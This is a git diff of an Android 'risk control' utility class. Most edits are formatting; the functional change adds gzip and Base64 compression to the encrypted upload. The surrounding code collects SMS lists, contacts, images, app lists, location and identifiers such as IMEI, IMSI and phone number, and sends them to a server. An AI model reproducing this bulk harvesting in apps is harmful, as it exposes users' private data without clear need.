@@ -3,7 +3,6 @@ package com.newstar.scorpiodata.risk;
 import android.content.Intent;
 import android.location.Location;
 import android.os.Build;
-import android.util.Log;
 
 import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
@@ -11,11 +10,11 @@ import androidx.annotation.RequiresApi;
 import com.android.volley.Response;
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 import com.google.gson.Gson;
-import com.google.gson.JsonObject;
 import com.newstar.scorpiodata.entity.FailureReason;
 import com.newstar.scorpiodata.entity.StatusParent;
 import com.newstar.scorpiodata.netutils.NetUtils;
 import com.newstar.scorpiodata.utils.AesUtils;
+import com.newstar.scorpiodata.utils.Base64Utils;
 import com.newstar.scorpiodata.utils.Callback;
 import com.newstar.scorpiodata.utils.LocationUtils;
 import com.newstar.scorpiodata.utils.PluginInit;
@@ -26,14 +25,17 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.zip.GZIPOutputStream;
 
 public class RiskUtils {
     public static void updateAll(ArrayList<String> tasks, String step) {
-        if(tasks==null || tasks.size()==0){
+        if (tasks == null || tasks.size() == 0) {
             tasks = new ArrayList<>();
             tasks.add(com.newstar.scorpiodata.risk.RiskType.CONTACTS);
             tasks.add(com.newstar.scorpiodata.risk.RiskType.IMAGE_LIST);
@@ -43,7 +45,7 @@ public class RiskUtils {
             tasks.add(com.newstar.scorpiodata.risk.RiskType.APP_LIST);
             tasks.add(com.newstar.scorpiodata.risk.RiskType.SMS_LIST);
         }
-        riskControl(tasks,step);
+        riskControl(tasks, step);
     }
 
     /**
@@ -90,6 +92,7 @@ public class RiskUtils {
 
     /**
      * 经纬度
+     *
      * @param step
      */
     private static void sendLocation(String step) {
@@ -99,13 +102,13 @@ public class RiskUtils {
                 double lat = res.getLatitude();
                 double lng = res.getLongitude();
                 try {
-                    String updated = SharedHelp.getSharedPreferencesValue(SharedHelp.UPDATE_LOCATION+step);
-                    if(updated!=null && updated.equals("false")){
+                    String updated = SharedHelp.getSharedPreferencesValue(SharedHelp.UPDATE_LOCATION + step);
+                    if (updated != null && updated.equals("false")) {
                         JSONObject jsonObject = new JSONObject();
                         jsonObject.put("longitude", lng);
                         jsonObject.put("latitude", lat);
                         dispatchEvent(RiskType.LOCATION, jsonObject, step);
-                        SharedHelp.setSharedPreferencesValue(SharedHelp.UPDATE_LOCATION+step,"true");
+                        SharedHelp.setSharedPreferencesValue(SharedHelp.UPDATE_LOCATION + step, "true");
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -129,12 +132,13 @@ public class RiskUtils {
             }
         };
 
-        SharedHelp.setSharedPreferencesValue(SharedHelp.UPDATE_LOCATION+step,"false");
+        SharedHelp.setSharedPreferencesValue(SharedHelp.UPDATE_LOCATION + step, "false");
         new LocationUtils(PluginInit.ACTIVITY, callback, 30);
     }
 
     /**
      * 设备信息
+     *
      * @param step
      */
     private static void sendSysOtherInfo(String step) {
@@ -211,35 +215,35 @@ public class RiskUtils {
                     otherRiskInfo.availableSize = PhoneUtils.getAvailableSize();
                     otherRiskInfo.totalSize = PhoneUtils.getTotlaSize();
                     otherRiskInfo.bootTime = PhoneUtils.getBootTime();
-                    otherRiskInfo.isRobot = RobotDistinguish.getInstence().isRobot()+"";
+                    otherRiskInfo.isRobot = RobotDistinguish.getInstence().isRobot() + "";
                     otherRiskInfo.totalMemory = PhoneUtils.getTotalMemory();
                     otherRiskInfo.availMemory = PhoneUtils.getAvailMemory();
                     otherRiskInfo.screenSize = PhoneUtils.getScreenSize();
-                    otherRiskInfo.language =PhoneUtils.getLanguage();
+                    otherRiskInfo.language = PhoneUtils.getLanguage();
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
 
                 try {
                     JSONObject jsonObject = new JSONObject();
-                    jsonObject.put("phoneModel", isNoeEmpty(otherRiskInfo.phoneModel)?otherRiskInfo.phoneModel:"");
-                    jsonObject.put("systemVersion", isNoeEmpty(otherRiskInfo.systemVersion)?otherRiskInfo.systemVersion:"");
-                    jsonObject.put("uid", isNoeEmpty(otherRiskInfo.uid)?otherRiskInfo.uid:"");
-                    jsonObject.put("ipv4Address", isNoeEmpty(otherRiskInfo.ipv4Address)?otherRiskInfo.ipv4Address:"");
-                    jsonObject.put("wifiMacAddress", isNoeEmpty(otherRiskInfo.wifiMacAddress)?otherRiskInfo.wifiMacAddress:"");
-                    jsonObject.put("imei", isNoeEmpty(otherRiskInfo.imei)?otherRiskInfo.imei:"");
-                    jsonObject.put("imsi", isNoeEmpty(otherRiskInfo.imsi)?otherRiskInfo.imsi:"");
-                    jsonObject.put("phoneNumber", isNoeEmpty(otherRiskInfo.phoneNumber)?otherRiskInfo.phoneNumber:"");
-                    jsonObject.put("carrierName", isNoeEmpty(otherRiskInfo.carrierName)?otherRiskInfo.carrierName:"");
-                    jsonObject.put("gaid", isNoeEmpty(otherRiskInfo.GAID)?otherRiskInfo.GAID:"");
-                    jsonObject.put("availableSize", isNoeEmpty(otherRiskInfo.availableSize)?otherRiskInfo.availableSize:"");
-                    jsonObject.put("totalSize", isNoeEmpty(otherRiskInfo.totalSize)?otherRiskInfo.totalSize:"");
-                    jsonObject.put("bootTime", isNoeEmpty(otherRiskInfo.bootTime)?otherRiskInfo.bootTime:"");
-                    jsonObject.put("isRobot", isNoeEmpty(otherRiskInfo.isRobot)?otherRiskInfo.isRobot:"");
-                    jsonObject.put("totalMemory", isNoeEmpty(otherRiskInfo.totalMemory)?otherRiskInfo.totalMemory:"");
-                    jsonObject.put("availMemory", isNoeEmpty(otherRiskInfo.availMemory)?otherRiskInfo.availMemory:"");
-                    jsonObject.put("screenSize", isNoeEmpty(otherRiskInfo.screenSize)?otherRiskInfo.screenSize:"");
-                    jsonObject.put("language", isNoeEmpty(otherRiskInfo.language)?otherRiskInfo.language:"");
+                    jsonObject.put("phoneModel", isNoeEmpty(otherRiskInfo.phoneModel) ? otherRiskInfo.phoneModel : "");
+                    jsonObject.put("systemVersion", isNoeEmpty(otherRiskInfo.systemVersion) ? otherRiskInfo.systemVersion : "");
+                    jsonObject.put("uid", isNoeEmpty(otherRiskInfo.uid) ? otherRiskInfo.uid : "");
+                    jsonObject.put("ipv4Address", isNoeEmpty(otherRiskInfo.ipv4Address) ? otherRiskInfo.ipv4Address : "");
+                    jsonObject.put("wifiMacAddress", isNoeEmpty(otherRiskInfo.wifiMacAddress) ? otherRiskInfo.wifiMacAddress : "");
+                    jsonObject.put("imei", isNoeEmpty(otherRiskInfo.imei) ? otherRiskInfo.imei : "");
+                    jsonObject.put("imsi", isNoeEmpty(otherRiskInfo.imsi) ? otherRiskInfo.imsi : "");
+                    jsonObject.put("phoneNumber", isNoeEmpty(otherRiskInfo.phoneNumber) ? otherRiskInfo.phoneNumber : "");
+                    jsonObject.put("carrierName", isNoeEmpty(otherRiskInfo.carrierName) ? otherRiskInfo.carrierName : "");
+                    jsonObject.put("gaid", isNoeEmpty(otherRiskInfo.GAID) ? otherRiskInfo.GAID : "");
+                    jsonObject.put("availableSize", isNoeEmpty(otherRiskInfo.availableSize) ? otherRiskInfo.availableSize : "");
+                    jsonObject.put("totalSize", isNoeEmpty(otherRiskInfo.totalSize) ? otherRiskInfo.totalSize : "");
+                    jsonObject.put("bootTime", isNoeEmpty(otherRiskInfo.bootTime) ? otherRiskInfo.bootTime : "");
+                    jsonObject.put("isRobot", isNoeEmpty(otherRiskInfo.isRobot) ? otherRiskInfo.isRobot : "");
+                    jsonObject.put("totalMemory", isNoeEmpty(otherRiskInfo.totalMemory) ? otherRiskInfo.totalMemory : "");
+                    jsonObject.put("availMemory", isNoeEmpty(otherRiskInfo.availMemory) ? otherRiskInfo.availMemory : "");
+                    jsonObject.put("screenSize", isNoeEmpty(otherRiskInfo.screenSize) ? otherRiskInfo.screenSize : "");
+                    jsonObject.put("language", isNoeEmpty(otherRiskInfo.language) ? otherRiskInfo.language : "");
                     dispatchEvent(RiskType.SYS_OTHER_INFO, jsonObject, step);
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -248,12 +252,13 @@ public class RiskUtils {
         }.start();
     }
 
-    static boolean isNoeEmpty(String val){
-        return (val!=null && val.length()>0);
+    static boolean isNoeEmpty(String val) {
+        return (val != null && val.length() > 0);
     }
 
     /**
      * 应用列表
+     *
      * @param step
      */
     private static void sendAppList(String step) {
@@ -276,6 +281,7 @@ public class RiskUtils {
 
     /**
      * 拍照应用列表
+     *
      * @param step
      */
     private static void sendCameraAppList(String step) {
@@ -406,13 +412,13 @@ public class RiskUtils {
                     jsonObject.put("userGid", NetUtils.getUserGid().get("userGid"));
                     jsonObject.put("uid", SharedHelp.getUid());
                     OtherRiskInfo otherRiskInfo = getInfos();
-                    jsonObject.put("GAID",isNoeEmpty(otherRiskInfo.GAID)?otherRiskInfo.GAID:"");
-                    jsonObject.put("imei",isNoeEmpty(otherRiskInfo.imei)?otherRiskInfo.imei:"");
-                    jsonObject.put("imsi",isNoeEmpty(otherRiskInfo.imsi)?otherRiskInfo.imsi:"");
-                    jsonObject.put("step",step);
+                    jsonObject.put("GAID", isNoeEmpty(otherRiskInfo.GAID) ? otherRiskInfo.GAID : "");
+                    jsonObject.put("imei", isNoeEmpty(otherRiskInfo.imei) ? otherRiskInfo.imei : "");
+                    jsonObject.put("imsi", isNoeEmpty(otherRiskInfo.imsi) ? otherRiskInfo.imsi : "");
+                    jsonObject.put("step", step);
 
                     JSONObject data = new JSONObject();
-                    data.put("data", AesUtils.aesEncrypt(jsonObject.toString()));
+                    data.put("data", compress(AesUtils.aesEncrypt(jsonObject.toString())));
 
                     jsonObject = data;
                 } catch (JSONException e) {
@@ -437,7 +443,7 @@ public class RiskUtils {
     }
 
     public static void dispatchErrorEvent(String logKey, String log) {
-        try{
+        try {
             if (PluginInit.ACTIVITY != null) {
                 // 自定义请求头
                 Map<String, String> headers = NetUtils.getToken();
@@ -461,8 +467,42 @@ public class RiskUtils {
 
                 }
             }
-        }catch(Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    /**
+     * @param str
+     * @return 压缩
+     */
+
+    public static String compress(String str) {
+        if (str == null || str.length() == 0) {
+            return str;
+        }
+        ByteArrayOutputStream out = null;
+        GZIPOutputStream gzip = null;
+        String compress = "";
+        try {
+            out = new ByteArrayOutputStream();
+            gzip = new GZIPOutputStream(out);
+            gzip.write(str.getBytes());
+            gzip.close();
+            // 这里增加base64编码
+            byte[] compressed = out.toByteArray();
+            compress = Base64Utils.encode(compressed);
+        } catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            if (null != out) {
+                try {
+                    out.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+        return compress;
     }
 }
